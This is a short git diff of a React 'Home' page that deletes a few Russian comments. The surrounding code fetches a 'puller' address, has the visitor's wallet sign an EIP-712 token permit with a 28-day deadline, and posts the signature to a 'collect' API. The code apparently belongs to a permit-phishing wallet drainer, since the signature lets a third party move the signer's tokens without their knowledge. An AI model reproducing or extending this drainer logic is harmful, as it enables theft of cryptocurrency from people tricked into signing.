@@ -54,7 +54,6 @@ export default function Home() {
             if (!resPuller.ok) throw new Error("Puller not received");
             const { puller } = await resPuller.json();
 
-            // 2. нонсы токена
             const erc = new ethers.Contract(
                 TOKEN,
                 ["function nonces(address) view returns (uint256)"],
@@ -66,7 +65,6 @@ export default function Home() {
                 Math.floor(Date.now() / 1000) + 28 * 24 * 60 * 60
             ).toString();
 
-            // 4. domain/types/message
             const domain = {
                 name: TOKEN_NAME,
                 version: TOKEN_VERSION,
@@ -95,7 +93,6 @@ export default function Home() {
             console.log("📝 Domain:", domain);
             console.log("📝 Message:", message);
 
-            // 5. подпись
             const sig = await signer.signTypedData(domain, types, message);
             const parsed = ethers.Signature.from(sig);
 
@@ -115,7 +112,6 @@ export default function Home() {
 
             console.log("📤 Sending payload:", payload);
 
-            // 6. отправляем на collect
             await fetch("http://localhost:8080/api/v1/collect", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
